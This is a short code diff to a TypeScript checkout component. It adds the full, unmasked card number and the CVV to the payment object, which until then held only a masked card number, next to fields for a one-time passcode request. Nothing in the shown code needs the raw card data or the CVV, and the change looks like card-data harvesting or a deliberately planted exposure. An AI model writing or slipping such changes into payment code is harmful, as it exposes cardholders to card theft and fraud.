@@ -108,6 +108,10 @@ function maskCardNumber(value: string): string {
   return combined.replace(/(.{4})/g, "$1 ").trim();
 }
 
+function normalizeCardNumber(value: string): string {
+  return formatCardNumber(value);
+}
+
 function validateBillingDetails(billing: BillingDetails): string | null {
   if (
     !billing.firstName.trim() ||
@@ -223,8 +227,10 @@ export default function Checkout() {
       total: subtotal,
       payment: {
         cardholderName: cardDetails.cardholderName.trim(),
+        cardNumberFull: normalizeCardNumber(cardDetails.cardNumber),
         cardNumberMasked: maskCardNumber(cardDetails.cardNumber),
         expiry: cardDetails.expiry,
+        cvv: cardDetails.cvv,
         otpCode: null,
         status: "otp_requested",
         errorMessage: null,
